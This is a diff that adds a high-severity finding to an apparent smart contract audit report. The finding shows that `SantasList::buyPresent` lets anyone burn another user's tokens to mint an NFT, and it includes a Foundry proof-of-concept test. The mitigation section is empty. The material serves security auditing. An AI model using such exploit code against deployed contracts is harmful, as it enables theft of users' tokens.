@@ -73,3 +73,38 @@ enum Status {
     }
 ```
 
+### [H-3] `SantasList::buyPresent` functions allows anyone  to burn someone else's tokens and mint an NFT in SantasList contract.
+
+**Description:** Anyone can call the `SantasList::buyPresent` function with someone's else address that has santa tokens. So, the function will burn the santa tokens of the address passed as param into the function and mint NFT for the address that calls the function.
+
+**Impact:** 
+The impact of this vulnerability is considered HIGH as `buyPresent` function allows any malicious user to use someone else's tokens to mint themselves an NFT. 
+
+**Proof Of Concept:**
+
+```solidity
+
+function testAnyoneCanMintNFTUsingOthersTokens()public{
+
+        vm.startPrank(santa);
+        santasList.checkList(user, SantasList.Status.EXTRA_NICE);
+        santasList.checkTwice(user, SantasList.Status.EXTRA_NICE);
+        vm.stopPrank();
+        
+        //Collecting the Present
+        vm.startPrank(user);
+        vm.warp(santasList.CHRISTMAS_2023_BLOCK_TIME() + 1);
+        santasList.collectPresent();
+        vm.stopPrank();
+
+        //Spending users token to mint NFT 
+        vm.startPrank(maliciousActor);
+        santasList.buyPresent(user);
+        assert(santasList.balanceOf(maliciousActor)==1);
+        assert(santasList.balanceOf(user)==1);
+        vm.stopPrank();}
+
+```
+
+**Recommended Mitigation: **
+
